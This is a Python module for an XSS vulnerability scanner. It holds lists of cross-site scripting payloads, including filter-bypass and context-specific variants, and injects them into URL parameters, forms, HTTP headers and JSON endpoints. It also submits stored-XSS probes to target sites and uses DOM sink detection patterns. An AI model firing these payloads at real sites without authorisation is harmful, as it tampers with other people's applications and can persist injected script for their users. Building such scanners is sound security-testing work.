"""
XSS Scanner Module
Detects Reflected, Stored, and DOM-based XSS vulnerabilities across:
- URL parameters
- HTML forms (GET & POST)
- HTTP headers (User-Agent, Referer)
- JSON API endpoints
"""

import httpx
import asyncio
import re
import json
import random
import string
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup
from typing import List, Dict, Tuple, Optional
from models.xss_models import (
    XSSFinding, XSSSummary, XSSResult,
    XSSType, InjectionPoint, SeverityLevel
)


# ──────────────────────────────────────────────
# Payload Templates (nonce injected at test-time)
# ──────────────────────────────────────────────

# {NONCE} is replaced at runtime with a unique random token per test.
# Verification checks only for the nonce string in the response,
# eliminating false positives from pages that already contain <script> or 'alert'.
REFLECTED_PAYLOAD_TEMPLATES = [
    '<script>alert("{NONCE}")</script>',
    '"><script>alert("{NONCE}")</script>',
    "'><script>alert('{NONCE}')</script>",
    '<img src=x onerror=alert("{NONCE}")>',
    '<svg onload=alert("{NONCE}")>',
    '"><img src=x onerror=alert("{NONCE}")>',
    '<body onload=alert("{NONCE}")>',
    '<ScRiPt>alert("{NONCE}")</ScRiPt>',        # case bypass
    '<details open ontoggle=alert("{NONCE}")>',
    '<input autofocus onfocus=alert("{NONCE}")>',
    # iframe/object/embed vectors
    '<iframe src="javascript:alert(\'{NONCE}\')" />',
    '<object data="javascript:alert(\'{NONCE}\')"></object>',
    '<embed src="javascript:alert(\'{NONCE}\')" />',
    '<math><mtext></the<mglyph><svg><mtext></the><textarea><title></textarea><img src=x onerror=alert("{NONCE}")>',
    '<a href="javascript:alert(\'{NONCE}\')">click</a>',
]

# Context-specific payload templates (selected by detect_injection_context)
ATTR_PAYLOAD_TEMPLATES = [
    '" onmouseover="alert(&quot;{NONCE}&quot;)',
    '" onfocus="alert(&quot;{NONCE}&quot;)" autofocus="',
    "' onmouseover='alert(`{NONCE}`)",
    '" style="x:expression(alert(&quot;{NONCE}&quot;))',      # IE
    '" tabindex="1" onfocus="alert(`{NONCE}`)',
]

SCRIPT_CONTEXT_TEMPLATES = [
    '</script><script>alert("{NONCE}")</script>',
    '";alert("{NONCE}");//',
    "';alert('{NONCE}');//",
    '`);alert(`{NONCE}`);//',
    '\\x3cscript\\x3ealert("{NONCE}")\\x3c/script\\x3e',
]

URL_CONTEXT_TEMPLATES = [
    'javascript:alert("{NONCE}")',
    'javascript://%0aalert(`{NONCE}`)',
    'data:text/html,<script>alert("{NONCE}")</script>',
]

COMMENT_CONTEXT_TEMPLATES = [
    '--> <script>alert("{NONCE}")</script> <!--',
    '--><img src=x onerror=alert(\'{NONCE}\')>',
    '--><svg onload=alert("{NONCE}")>',
]

DOM_PAYLOAD_TEMPLATES = [
    '#<script>alert("{NONCE}")</script>',
    '#"><script>alert("{NONCE}")</script>',
    '#<img src=x onerror=alert("{NONCE}")>',
    '?q=<script>alert("{NONCE}")</script>',
]

STORED_XSS_MARKER_TEMPLATES = [
    '<script>alert("{NONCE}")</script>',
    '<img src=x onerror=alert("{NONCE}")>',
    '<svg onload=alert("{NONCE}")>',
]

HEADER_PAYLOAD_TEMPLATES = [
    '<script>alert("{NONCE}")</script>',
    '"><script>alert("{NONCE}")</script>',
    '<img src=x onerror=alert("{NONCE}")>',
]

JSON_PAYLOAD_TEMPLATES = [
    '<script>alert("{NONCE}")</script>',
    '"><script>alert("{NONCE}")</script>',
    '<img src=x onerror=alert("{NONCE}")>',
    '<svg onload=alert("{NONCE}")>',
]


def make_payload(template: str, nonce: str) -> str:
    """Substitute {NONCE} in a payload template with the given nonce."""
    return template.replace("{NONCE}", nonce)

# DOM sink patterns to detect in HTML/JS source
DOM_SINK_PATTERNS = [
    r'document\.write\s*\(',
    r'innerHTML\s*=',
    r'outerHTML\s*=',
    r'insertAdjacentHTML\s*\(',
    r'eval\s*\(',
    r'setTimeout\s*\(\s*["\']',
    r'setInterval\s*\(\s*["\']',
    r'location\.href\s*=',
    r'location\.hash',
    r'window\.location\s*=',
    r'document\.URL',
    r'document\.location',
    r'document\.referrer',
]

# DOM source patterns (user-controlled input sources)
DOM_SOURCE_PATTERNS = [
    r'location\.search',
    r'location\.hash',
    r'location\.href',
    r'document\.URL',
    r'document\.referrer',
    r'window\.name',
    r'document\.cookie',
]


# ──────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────

def extract_url_params(url: str) -> Dict[str, str]:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    return {k: v[0] for k, v in params.items()}


def inject_url_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def generate_token(length: int = 8) -> str:
    """Generate a unique random string for injection correlation."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def nonce_reflected(nonce: str, payload: str, response_text: str, status_code: int = 200) -> bool:
    """
    Verify XSS by checking that the unique nonce embedded in the payload is
    present in the response in an unencoded (executable) form.

    Using a per-request random nonce instead of generic strings like 'alert'
    eliminates false positives when the original page already contains
    <script> tags, event handlers, or the word 'alert' in its own content.

    Steps:
      1. 4xx/5xx responses — only confirm if nonce appears unencoded
         (WAF block pages often echo the payload back as text).
      2. Check the literal payload appears unencoded in the response.
      3. Nonce-only fallback — if the exact payload was modified by the app
         but the nonce still appears unencoded, it is still flagged.
    """
    lower_text = response_text.lower()
    lower_payload = payload.lower()
    lower_nonce = nonce.lower()
    encoded_nonce = nonce.lower()  # nonces are alphanumeric, encoding doesn't change them

    # 1. Conservative handling for error/WAF pages
    if status_code >= 400:
        # Only confirm if the nonce appears AND the surrounding tag is unencoded
        if lower_nonce in lower_text:
            # Make sure it isn't just shown as escaped HTML
            if "&lt;" not in lower_text and "&gt;" not in lower_text:
                return True
        return False

    # 2. Check for the full literal payload (unencoded)
    if lower_payload in lower_text:
        # Payload contains HTML tags — check they are NOT entity-encoded
        if "<" in payload and "&lt;" in response_text.lower():
            return False
        if ">" in payload and "&gt;" in response_text.lower():
            return False
        return True

    # 3. Nonce-only fallback: app may have partially modified the payload
    # but the nonce (alphanumeric) still appears unencoded in an inline context
    if lower_nonce in lower_text:
        # Make sure the nonce is not inside an HTML-encoded attribute value
        if "&lt;" not in lower_text and "&gt;" not in lower_text:
            return True

    return False


def detect_dom_sinks(html: str) -> List[str]:
    """Find dangerous DOM sinks in page source."""
    found = []
    for pattern in DOM_SINK_PATTERNS:
        matches = re.findall(pattern, html, re.IGNORECASE)
        if matches:
            found.extend(matches[:2])  # cap per pattern
    return list(set(found))


def detect_dom_sources(html: str) -> List[str]:
    """Find user-controlled DOM sources in page source."""
    found = []
    for pattern in DOM_SOURCE_PATTERNS:
        matches = re.findall(pattern, html, re.IGNORECASE)
        if matches:
            found.extend(matches[:2])
    return list(set(found))


def extract_forms(html: str, base_url: str):
    """Extract forms with their fields from page HTML."""
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action", "")
        method = form.get("method", "get").lower()
        full_action = urljoin(base_url, action) if action else base_url
        inputs = {}
        for inp in form.find_all(["input", "textarea"]):
            name = inp.get("name")
            if name:
                inputs[name] = inp.get("value", "test")
        forms.append({
            "action": full_action,
            "method": method,
            "inputs": inputs,
        })
    return forms


def calculate_risk(findings: List[XSSFinding]) -> SeverityLevel:
    if not findings:
        return SeverityLevel.LOW
    severities = [f.severity for f in findings]
    if SeverityLevel.CRITICAL in severities:
        return SeverityLevel.CRITICAL
    if SeverityLevel.HIGH in severities:
        return SeverityLevel.HIGH
    if SeverityLevel.MEDIUM in severities:
        return SeverityLevel.MEDIUM
    return SeverityLevel.LOW


# ──────────────────────────────────────────────
# Context Detection
# ──────────────────────────────────────────────

def detect_injection_context(html: str, probe: str) -> str:
    """
    Determine the HTML context where `probe` is reflected.
    Returns one of: 'html_body', 'attr', 'script', 'url', 'comment', 'unknown'

    The probe is a harmless alphanumeric string injected as a baseline check
    before the real XSS payload is chosen.
    """
    idx = html.lower().find(probe.lower())
    if idx == -1:
        return "unknown"

    # Check preceding context window (200 chars before the probe)
    pre = html[max(0, idx - 200):idx].lower()
    post = html[idx + len(probe):idx + len(probe) + 100].lower()

    # Script context — inside a <script> block
    if "<script" in pre and "</script" not in pre:
        return "script"

    # HTML comment context
    if "<!--" in pre and "-->" not in pre:
        return "comment"

    # URL context — inside href, src, action, data attribute
    url_attr_markers = ['href="', "href='", 'src="', "src='", 'action="', "action='", 'data="', "data='"]
    if any(m in pre for m in url_attr_markers):
        return "url"

    # Tag attribute context — inside an open HTML tag attribute
    if '"' in pre and '<' in pre:
        # Check if we're inside an attribute value (between quotes after an =)
        snippets = pre.split('<')
        last_tag = snippets[-1] if snippets else ""
        eq_count  = last_tag.count('=')
        quot_after_eq = last_tag[last_tag.rfind('='):].count('"')
        if eq_count >= 1 and quot_after_eq % 2 == 1:  # odd quotes = inside attribute
            return "attr"

    # Default to HTML body context
    return "html_body"


def get_context_payloads(context: str) -> List[str]:
    """Return the most appropriate payload templates for a given injection context."""
    if context == "attr":
        return ATTR_PAYLOAD_TEMPLATES
    if context == "script":
        return SCRIPT_CONTEXT_TEMPLATES
    if context == "url":
        return URL_CONTEXT_TEMPLATES
    if context == "comment":
        return COMMENT_CONTEXT_TEMPLATES
    # html_body / unknown — use all standard templates
    return REFLECTED_PAYLOAD_TEMPLATES


# ──────────────────────────────────────────────
# Test: Reflected XSS via URL Parameters
# ──────────────────────────────────────────────

async def test_reflected_url_params(
    client: httpx.AsyncClient,
    url: str,
    timeout: int,
    findings: List[XSSFinding],
    errors: List[str],
    payloads_tested: List[str],
):
    params = extract_url_params(url)
    if not params:
        return

    semaphore = asyncio.Semaphore(5)

    async def _test_param_payload(p, tmpl):
        async with semaphore:
            # Generate a fresh nonce for every individual test so reflection is unambiguous
            nonce = generate_token(10)
            py = make_payload(tmpl, nonce)
            payloads_tested.append(py)
            injected_url = inject_url_param(url, p, py)
            try:
                resp = await client.get(injected_url, timeout=timeout)
                if nonce_reflected(nonce, py, resp.text, resp.status_code):
                    findings.append(XSSFinding(
                        xss_type=XSSType.REFLECTED,
                        injection_point=InjectionPoint.URL_PARAM,
                        parameter=p,
                        payload=py,
                        evidence=(
                            f"Nonce '{nonce}' found unescaped in response body for "
                            f"parameter '{p}' — confirms payload execution context"
                        ),
                        severity=SeverityLevel.HIGH,
                        description=(
                            f"URL parameter '{p}' is vulnerable to Reflected XSS. "
                            f"The application echoes user input back into the HTML without sanitization."
                        ),
                        remediation=(
                            "Encode all user-supplied output using context-aware escaping "
                            "(HTML entity encoding). Implement a Content Security Policy (CSP) header. "
                            "Use a templating engine with auto-escaping enabled."
                        ),
                    ))
                    return True  # found
            except httpx.TimeoutException:
                errors.append(f"Timeout on URL param '{p}'")
            except Exception as e:
                errors.append(f"Error on URL param '{p}': {str(e)}")
            return False

    # Parallelize over parameters; each payload gets its own nonce
    for param in params:
        param_payload_tasks = [
            _test_param_payload(param, tmpl)
            for tmpl in REFLECTED_PAYLOAD_TEMPLATES
        ]
        await asyncio.gather(*param_payload_tasks)


# ──────────────────────────────────────────────
# Test: Reflected & Stored XSS via Forms
# ──────────────────────────────────────────────

async def test_forms_xss(
    client: httpx.AsyncClient,
    url: str,
    timeout: int,
    findings: List[XSSFinding],
    errors: List[str],
    payloads_tested: List[str],
):
    try:
        resp = await client.get(url, timeout=timeout)
        forms = extract_forms(resp.text, url)
    except Exception as e:
        errors.append(f"Could not fetch page for form extraction: {str(e)}")
        return

    for form in forms:
        action = form["action"]
        method = form["method"]
        base_inputs = form["inputs"]

        injection_point = InjectionPoint.FORM_GET if method == "get" else InjectionPoint.FORM_POST

        semaphore = asyncio.Semaphore(3)

        async def _test_form_field_payload(f_name, tmpl):
            async with semaphore:
                # Unique nonce per attempt — avoids FP when page pre-renders 'alert'
                nonce = generate_token(10)
                py = make_payload(tmpl, nonce)
                payloads_tested.append(py)
                data = {**base_inputs, f_name: py}
                try:
                    if method == "post":
                        resp = await client.post(action, data=data, timeout=timeout)
                    else:
                        resp = await client.get(action, params=data, timeout=timeout)

                    if nonce_reflected(nonce, py, resp.text, resp.status_code):
                        findings.append(XSSFinding(
                            xss_type=XSSType.REFLECTED,
                            injection_point=injection_point,
                            parameter=f_name,
                            payload=py,
                            evidence=(
                                f"Nonce '{nonce}' found unescaped in form response "
                                f"via {method.upper()} to '{action}' for field '{f_name}'"
                            ),
                            severity=SeverityLevel.HIGH,
                            description=(
                                f"Form field '{f_name}' at '{action}' is vulnerable to "
                                f"Reflected XSS via {method.upper()} submission."
                            ),
                            remediation=(
                                "Sanitize and encode all form input before rendering. "
                                "Use CSRF tokens on all forms. "
                                "Implement strict CSP headers."
                            ),
                        ))
                        return True
                except Exception as e:
                    errors.append(f"Error on form '{action}' field '{f_name}': {str(e)}")
                return False

        field_payload_tasks = [
            _test_form_field_payload(field_name, tmpl)
            for field_name in base_inputs
            for tmpl in REFLECTED_PAYLOAD_TEMPLATES[:6]
        ]
        await asyncio.gather(*field_payload_tasks)

        # ── Stored XSS: nonce-based persistence check ──
        # We submit a unique nonce embedded in the payload and then re-fetch
        # the page to confirm the nonce persists unencoded.
        for tmpl in STORED_XSS_MARKER_TEMPLATES[:2]:
            stored_nonce = generate_token(10)
            payload = make_payload(tmpl, stored_nonce)
            payloads_tested.append(payload)
            data = {k: payload for k in base_inputs}
            try:
                if method == "post":
                    await client.post(action, data=data, timeout=timeout)
                else:
                    await client.get(action, params=data, timeout=timeout)

                # Re-fetch the page to check if the nonce persists (= stored XSS)
                check_resp = await client.get(url, timeout=timeout)
                if stored_nonce in check_resp.text and "&lt;" not in check_resp.text:
                    findings.append(XSSFinding(
                        xss_type=XSSType.STORED,
                        injection_point=injection_point,
                        parameter=", ".join(base_inputs.keys()),
                        payload=payload,
                        evidence=(
                            f"Stored XSS confirmed: nonce '{stored_nonce}' persisted "
                            f"unencoded when re-visiting '{url}'"
                        ),
                        severity=SeverityLevel.CRITICAL,
                        description=(
                            f"The form at '{action}' stores user input which is later rendered "
                            f"unescaped — confirming Stored (Persistent) XSS."
                        ),
                        remediation=(
                            "Sanitize data on both input AND output. "
                            "Use an allowlist-based HTML sanitizer (e.g. DOMPurify). "
                            "Store raw data, escape on render — never store HTML."
                        ),
                    ))
                    break
            except Exception as e:
                errors.append(f"Stored XSS check error: {str(e)}")


# ──────────────────────────────────────────────
# Test: DOM-based XSS
# ──────────────────────────────────────────────

async def test_dom_xss(
    client: httpx.AsyncClient,
    url: str,
    timeout: int,
    findings: List[XSSFinding],
    errors: List[str],
    payloads_tested: List[str],
):
    try:
        resp = await client.get(url, timeout=timeout)
        html = resp.text

        sinks = detect_dom_sinks(html)
        sources = detect_dom_sources(html)

        if sinks and sources:
            # Both sources and sinks present = DOM XSS likely
            findings.append(XSSFinding(
                xss_type=XSSType.DOM,
                injection_point=InjectionPoint.URL_PARAM,
                parameter="DOM source → sink flow",
                payload=", ".join(DOM_PAYLOAD_TEMPLATES[:3]),
                evidence=(
                    f"Dangerous DOM sinks detected: {', '.join(sinks[:3])}. "
                    f"User-controlled sources detected: {', '.join(sources[:3])}."
                ),
                severity=SeverityLevel.HIGH,
                description=(
                    "The page contains user-controlled DOM sources (e.g. location.hash, "
                    "document.URL) flowing into dangerous DOM sinks (e.g. innerHTML, eval). "
                    "This indicates a high risk of DOM-based XSS."
                ),
                remediation=(
                    "Never pass user-controlled data to dangerous DOM sinks. "
                    "Use textContent instead of innerHTML. "
                    "Avoid eval() entirely. Implement a strict CSP with 'unsafe-eval' blocked."
                ),
            ))
        elif sinks:
            # Sinks without confirmed sources — medium risk
            findings.append(XSSFinding(
                xss_type=XSSType.DOM,
                injection_point=InjectionPoint.URL_PARAM,
                parameter="DOM sink detected",
                payload="N/A — static analysis",
                evidence=f"Dangerous DOM sinks found in page source: {', '.join(sinks[:5])}",
                severity=SeverityLevel.MEDIUM,
                description=(
                    "Dangerous DOM sinks were found in the page's JavaScript. "
                    "If user-controlled input reaches these sinks, DOM XSS is possible."
                ),
                remediation=(
                    "Audit all uses of innerHTML, document.write, and eval. "
                    "Replace with safe alternatives like textContent and JSON.parse."
                ),
            ))

        # Also test hash-based DOM payloads by checking if hash is read in JS
        if sources:
            for tmpl in DOM_PAYLOAD_TEMPLATES:
                nonce = generate_token(10)
                payload = make_payload(tmpl, nonce)
                payloads_tested.append(payload)
                test_url = url + payload
                try:
                    dom_resp = await client.get(test_url, timeout=timeout)
                    if nonce_reflected(nonce, payload, dom_resp.text, dom_resp.status_code):
                        findings.append(XSSFinding(
                            xss_type=XSSType.DOM,
                            injection_point=InjectionPoint.URL_PARAM,
                            parameter="URL fragment / hash",
                            payload=payload,
                            evidence=(
                                f"DOM payload nonce '{nonce}' reflected unencoded in "
                                f"server response for: {test_url}"
                            ),
                            severity=SeverityLevel.HIGH,
                            description=(
                                "A DOM-based XSS payload injected via the URL fragment was "
                                "reflected in the server response, indicating server-side DOM processing."
                            ),
                            remediation=(
                                "Never process URL fragments server-side. "
                                "Sanitize hash values before using in DOM operations."
                            ),
                        ))
                        break
                except Exception:
                    pass

    except httpx.TimeoutException:
        errors.append(f"Timeout during DOM XSS analysis")
    except Exception as e:
        errors.append(f"DOM XSS analysis error: {str(e)}")


# ──────────────────────────────────────────────
# Test: XSS via HTTP Headers
# ──────────────────────────────────────────────

async def test_header_xss(
    client: httpx.AsyncClient,
    url: str,
    timeout: int,
    findings: List[XSSFinding],
    errors: List[str],
    payloads_tested: List[str],
):
    headers_to_test = {
        "User-Agent": "Mozilla/5.0",
        "Referer": url,
        "X-Forwarded-For": "127.0.0.1",
        "Accept-Language": "en-US",
    }

    semaphore = asyncio.Semaphore(5)

    async def _test_header_payload(h_name, tmpl):
        async with semaphore:
            nonce = generate_token(10)
            py = make_payload(tmpl, nonce)
            payloads_tested.append(py)
            custom_headers = {**headers_to_test, h_name: py}
            try:
                resp = await client.get(url, headers=custom_headers, timeout=timeout)
                if nonce_reflected(nonce, py, resp.text, resp.status_code):
                    findings.append(XSSFinding(
                        xss_type=XSSType.REFLECTED,
                        injection_point=InjectionPoint.HEADER,
                        parameter=h_name,
                        payload=py,
                        evidence=(
                            f"Nonce '{nonce}' found unescaped after injecting via "
                            f"HTTP header '{h_name}' — confirms reflection without sanitization"
                        ),
                        severity=SeverityLevel.HIGH,
                        description=(
                            f"The application reflects the value of the '{h_name}' "
                            f"HTTP header into the HTML response without sanitization."
                        ),
                        remediation=(
                            "Never reflect raw HTTP header values into HTML responses. "
                            "Sanitize and encode any header-derived values before output. "
                            "Implement CSP headers to mitigate XSS impact."
                        ),
                    ))
                    return True
            except Exception as e:
                errors.append(f"Header XSS error for '{h_name}': {str(e)}")
            return False

    header_tasks = []
    for header_name in headers_to_test:
        for tmpl in HEADER_PAYLOAD_TEMPLATES:
            header_tasks.append(_test_header_payload(header_name, tmpl))

    await asyncio.gather(*header_tasks)


# ──────────────────────────────────────────────
# Test: XSS via JSON API Endpoints
# ──────────────────────────────────────────────

async def test_json_xss(
    client: httpx.AsyncClient,
    url: str,
    timeout: int,
    findings: List[XSSFinding],
    errors: List[str],
    payloads_tested: List[str],
):
    params = extract_url_params(url)
    if not params:
        return

    json_headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
    }

    semaphore = asyncio.Semaphore(5)

    async def _test_json_field_payload(p, tmpl):
        async with semaphore:
            nonce = generate_token(10)
            py = make_payload(tmpl, nonce)
            payloads_tested.append(py)
            json_body = {p: py}
            try:
                resp = await client.post(
                    url,
                    json=json_body,
                    headers=json_headers,
                    timeout=timeout,
                )
                content_type = resp.headers.get("content-type", "")
                # Only flag if the nonce appears unencoded AND response is not pure JSON
                if (
                    nonce_reflected(nonce, py, resp.text, resp.status_code)
                    and "application/json" not in content_type
                ):
                    findings.append(XSSFinding(
                        xss_type=XSSType.REFLECTED,
                        injection_point=InjectionPoint.JSON,
                        parameter=p,
                        payload=py,
                        evidence=(
                            f"Nonce '{nonce}' in JSON body for key '{p}' was reflected "
                            f"unencoded in a non-JSON response (content-type: {content_type})"
                        ),
                        severity=SeverityLevel.HIGH,
                        description=(
                            f"The endpoint accepted a JSON payload with XSS in field '{p}' "
                            f"and reflected it back in an HTML response — indicating improper "
                            f"output encoding for JSON-sourced data."
                        ),
                        remediation=(
                            "Ensure JSON API responses always return Content-Type: application/json. "
                            "Encode all JSON values before rendering in HTML context. "
                            "Use JSON.stringify() safely and avoid injecting JSON directly into HTML."
                        ),
                    ))
                    return True
            except Exception as e:
                errors.append(f"JSON XSS error for '{p}': {str(e)}")
            return False

    json_field_tasks = [
        _test_json_field_payload(param, tmpl)
        for param in params
        for tmpl in JSON_PAYLOAD_TEMPLATES
    ]
    await asyncio.gather(*json_field_tasks)


# ──────────────────────────────────────────────
# Test: DOM XSS via Playwright (Real Browser Execution)
# ──────────────────────────────────────────────

async def test_dom_xss_playwright(
    url: str,
    timeout: int,
    findings: List[XSSFinding],
    errors: List[str],
    payloads_tested: List[str],
):
    """
    True DOM XSS detection using a headless Chromium browser via Playwright.

    Unlike httpx (which only sees server-rendered HTML), Playwright executes
    JavaScript and intercepts browser dialog (alert) events.

    Each test:
      1. Generates a unique nonce
      2. Injects it as: <script>alert('NONCE')</script>
      3. Navigates to the injected URL
      4. Intercepts any dialog — if the nonce appears in the dialog message,
         the payload was executed in the real DOM context (confirmed DOM XSS)

    This is how Burp's browser plugin catches DOM XSS that passive scanning misses.
    """
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        errors.append("Playwright not installed — DOM XSS browser scan skipped")
        return

    try:
        params = extract_url_params(url)
        if not params:
            return

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(
                ignore_https_errors=True,
                user_agent="WebVulnScanner/Playwright DOM XSS",
            )
            page = await context.new_page()

            for param in params:
                nonce = generate_token(12)
                # Compact alert payload — no extra quotes to avoid URL encoding issues
                payload = f"<script>alert('{nonce}')</script>"
                payloads_tested.append(payload)

                injected_url = inject_url_param(url, param, payload)
                alerted_nonce: Optional[str] = None

                async def _handle_dialog(dialog):
                    nonlocal alerted_nonce
                    try:
                        msg = dialog.message
                        if nonce in msg:
                            alerted_nonce = msg
                    except Exception:
                        pass
                    await dialog.dismiss()

                page.on("dialog", _handle_dialog)
                try:
                    await page.goto(injected_url, timeout=timeout * 1000, wait_until="domcontentloaded")
                    # Give JS 1.5s to execute deferred scripts
                    await asyncio.sleep(1.5)
                except Exception:
                    pass
                finally:
                    page.remove_listener("dialog", _handle_dialog)

                if alerted_nonce:
                    findings.append(XSSFinding(
                        xss_type=XSSType.DOM,
                        injection_point=InjectionPoint.URL_PARAM,
                        parameter=param,
                        payload=payload,
                        evidence=(
                            f"[Playwright] DOM alert() intercepted with nonce '{nonce}' — "
                            f"payload executed in live browser context for parameter '{param}'"
                        ),
                        severity=SeverityLevel.HIGH,
                        description=(
                            f"Parameter '{param}' is vulnerable to DOM-based XSS confirmed by "
                            f"real browser execution. The JavaScript payload alert was triggered "
                            f"during page rendering in headless Chromium."
                        ),
                        remediation=(
                            "Sanitize user input before writing to the DOM. "
                            "Use textContent instead of innerHTML. "
                            "Avoid eval(), document.write(), and setTimeout with string args. "
                            "Implement a strict Content Security Policy (CSP)."
                        ),
                    ))

            await browser.close()

    except Exception as e:
        errors.append(f"Playwright DOM XSS scan error: {str(e)}")


# ──────────────────────────────────────────────
# Main Scanner Entry Point
# ──────────────────────────────────────────────

async def run_xss_scan(
    urls: List[str],
    timeout: int = 10,
    test_forms: bool = True,
    test_headers: bool = True,
    test_json: bool = True,
) -> dict:
    findings: List[XSSFinding] = []
    errors: List[str] = []
    payloads_tested: List[str] = []

    if isinstance(urls, str):
        urls = [urls]

    if not urls:
        return {
            "url": "none",
            "status": "completed",
            "summary": XSSSummary(
                total_parameters_tested=0,
                total_payloads_tested=0,
                vulnerabilities_found=0,
                reflected_xss=0,
                stored_xss=0,
                dom_xss=0,
                risk_level=SeverityLevel.LOW,
            ),
            "findings": [],
            "errors": ["No URLs provided to test."],
        }

    primary_url = urls[0]
    total_params = 0

    async with httpx.AsyncClient(
        follow_redirects=True,
        headers={"User-Agent": "WebVulnScanner/1.0 (educational use)"},
    ) as client:
        # Verify target is reachable
        try:
            await client.get(primary_url, timeout=timeout)
        except Exception as e:
            return {
                "url": primary_url,
                "status": "unreachable",
                "summary": XSSSummary(
                    total_parameters_tested=0,
                    total_payloads_tested=0,
                    vulnerabilities_found=0,
                    reflected_xss=0,
                    stored_xss=0,
                    dom_xss=0,
                    risk_level=SeverityLevel.LOW,
                ),
                "findings": [],
                "errors": [f"Could not reach target: {str(e)}"],
            }

        # Run testing for all URLs
        for url in urls:
            total_params += len(extract_url_params(url))

            tasks = [
                test_reflected_url_params(client, url, timeout, findings, errors, payloads_tested),
                test_dom_xss(client, url, timeout, findings, errors, payloads_tested),
            ]
            if test_forms:
                tasks.append(test_forms_xss(client, url, timeout, findings, errors, payloads_tested))
            if test_headers:
                tasks.append(test_header_xss(client, url, timeout, findings, errors, payloads_tested))
            if test_json:
                tasks.append(test_json_xss(client, url, timeout, findings, errors, payloads_tested))

            await asyncio.gather(*tasks)

        # Playwright DOM XSS — runs outside httpx client (manages its own browser instance)
        # Run per-URL sequentially to avoid Playwright concurrency issues
        for url in urls:
            await test_dom_xss_playwright(url, timeout, findings, errors, payloads_tested)

    # Deduplicate by (xss_type, parameter, payload)
    seen = set()
    unique_findings = []
    for f in findings:
        key = (f.xss_type, f.parameter, f.payload)
        if key not in seen:
            seen.add(key)
            unique_findings.append(f)

    reflected_count = sum(1 for f in unique_findings if f.xss_type == XSSType.REFLECTED)
    stored_count = sum(1 for f in unique_findings if f.xss_type == XSSType.STORED)
    dom_count = sum(1 for f in unique_findings if f.xss_type == XSSType.DOM)

    summary = XSSSummary(
        total_parameters_tested=total_params,
        total_payloads_tested=len(payloads_tested),
        vulnerabilities_found=len(unique_findings),
        reflected_xss=reflected_count,
        stored_xss=stored_count,
        dom_xss=dom_count,
        risk_level=calculate_risk(unique_findings),
    )

    return {
        "url": primary_url,
        "status": "completed",
        "summary": summary,
        "findings": unique_findings,
        "errors": errors,
    }